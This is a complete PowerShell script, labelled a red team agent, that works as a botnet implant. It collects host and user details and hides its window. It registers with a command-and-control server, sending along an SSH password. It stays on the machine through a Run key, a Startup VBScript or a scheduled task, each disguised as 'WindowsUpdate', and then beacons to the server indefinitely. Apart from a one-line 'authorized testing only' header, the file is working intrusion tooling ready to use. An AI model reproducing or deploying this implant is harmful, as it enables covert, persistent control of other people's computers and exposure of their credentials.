# Professional Red Team Agent - Windows PowerShell
# For authorized penetration testing only

param(
    [string]$CncServer = $env:CNC_SERVER,
    [string]$BotId = $env:BOT_ID,
    [string]$SshPassword = $env:SSH_PASSWORD,
    [switch]$NoPersist,
    [switch]$Verbose,
    [switch]$Hidden
)

# Set defaults if not provided
if (-not $CncServer) { $CncServer = "http://192.168.1.10:5000" }
if (-not $SshPassword) { $SshPassword = "CHANGE_ME" }
if (-not $BotId) { $BotId = "$env:COMPUTERNAME-$(Get-Random -Maximum 9999)" }

$StealthMode = -not $Verbose
$MaxRetries = 3

# Function for logging
function Write-Log {
    param([string]$Level, [string]$Message)
    if (-not $StealthMode) {
        Write-Host "[$Level] $Message"
    }
}

# Hide PowerShell window if requested
if ($Hidden) {
    $code = @"
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
"@
    Add-Type -MemberDefinition $code -Name "Win32ShowWindow" -Namespace Win32Functions
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    [Win32Functions.Win32ShowWindow]::ShowWindow($hwnd, 0) | Out-Null
}

# Gather system information with error handling
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME

try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
           Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -ne "127.0.0.1"} | 
           Select-Object -First 1).IPAddress
    
    if (-not $ip) {
        $ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
    }
    
    if (-not $ip) {
        $ip = "127.0.0.1"
    }
} catch {
    $ip = "127.0.0.1"
}

# Function to register with C&C server (with retries)
function Register-Bot {
    Write-Log "*" "Attempting to register with C&C server: $CncServer"
    Write-Log "*" "Bot ID: $BotId"
    Write-Log "*" "Hostname: $hostname"
    Write-Log "*" "Username: $username"
    Write-Log "*" "IP: $ip"
    
    $body = @{
        bot_id = $BotId
        host = $ip
        port = 22
        username = $username
        password = $SshPassword
        hostname = $hostname
        os = "Windows"
    } | ConvertTo-Json
    
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $response = Invoke-RestMethod -Uri "$CncServer/add_bot" `
                                        -Method POST `
                                        -ContentType "application/json" `
                                        -Body $body `
                                        -TimeoutSec 10 `
                                        -ErrorAction Stop
            
            if ($response.status -eq "success") {
                Write-Log "+" "Successfully registered with C&C server!"
                return $true
            }
        }
        catch {
            Write-Log "-" "Registration attempt $attempt failed: $_"
            if ($attempt -lt $MaxRetries) {
                Start-Sleep -Seconds ($attempt * 5)
            }
        }
    }
    
    Write-Log "-" "Failed to register after $MaxRetries attempts"
    return $false
}

# Function to send heartbeat
function Send-Heartbeat {
    try {
        $body = @{
            bot_id = $BotId
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$CncServer/heartbeat" `
                                    -Method POST `
                                    -ContentType "application/json" `
                                    -Body $body `
                                    -TimeoutSec 10 `
                                    -ErrorAction Stop
        
        if ($response.status -eq "success") {
            Write-Log "." "Heartbeat sent successfully"
            return $true
        }
    }
    catch {
        Write-Log "-" "Heartbeat failed: $_"
        return $false
    }
    
    return $false
}

# Function to establish persistence
function Set-Persistence {
    Write-Log "*" "Establishing persistence..."
    
    $scriptPath = $MyInvocation.MyCommand.Path
    $success = $false
    
    # Method 1: Registry Run key (most reliable)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -ErrorAction Stop
        Write-Log "+" "Registry persistence established"
        $success = $true
    }
    catch {
        Write-Log "-" "Registry persistence failed: $_"
    }
    
    # Method 2: Startup folder with VBScript wrapper (silent execution)
    if (-not $success) {
        try {
            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $vbsPath = Join-Path $startupPath "WindowsUpdate.vbs"
            
            $vbsContent = @"
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$scriptPath""", 0, False
"@
            Set-Content -Path $vbsPath -Value $vbsContent -Force
            Write-Log "+" "Startup folder persistence established"
            $success = $true
        }
        catch {
            Write-Log "-" "Startup folder persistence failed: $_"
        }
    }
    
    # Method 3: Scheduled Task (runs at logon)
    if (-not $success) {
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtLogon
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            
            Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
            Write-Log "+" "Scheduled task persistence established"
            $success = $true
        }
        catch {
            Write-Log "-" "Scheduled task persistence failed: $_"
        }
    }
    
    return $success
}

# Function to beacon loop
function Start-BeaconLoop {
    Write-Log "*" "Starting beacon loop..."
    
    $consecutiveFailures = 0
    $maxFailures = 10
    
    while ($true) {
        try {
            Start-Sleep -Seconds 60
            
            # Send heartbeat to update last_seen status
            if (Send-Heartbeat) {
                $consecutiveFailures = 0
            }
            else {
                $consecutiveFailures++
            }
            
            # Check if we need to re-register
            if ($consecutiveFailures -gt $maxFailures) {
                Write-Log "!" "Max failures reached, attempting re-registration..."
                if (Register-Bot) {
                    $consecutiveFailures = 0
                }
                else {
                    Start-Sleep -Seconds 300  # Wait 5 minutes
                }
            }
        }
        catch {
            $consecutiveFailures++
            Write-Log "-" "Beacon error: $_"
            Start-Sleep -Seconds 60
        }
    }
}

# Main execution
Write-Log "*" "Red Team Agent Initializing..."
Write-Log "*" "="*60

# Register with C&C server
if (Register-Bot) {
    # Establish persistence unless disabled
    if (-not $NoPersist) {
        Set-Persistence | Out-Null
    }
    else {
        Write-Log "!" "Skipping persistence (NoPersist flag set)"
    }
    
    # Start beacon loop
    Start-BeaconLoop
}
else {
    Write-Log "-" "Initial registration failed, will retry..."
    # Don't exit, keep trying
    while ($true) {
        Start-Sleep -Seconds 300  # Wait 5 minutes
        if (Register-Bot) {
            if (-not $NoPersist) {
                Set-Persistence | Out-Null
            }
            Start-BeaconLoop
            break
        }
    }
}
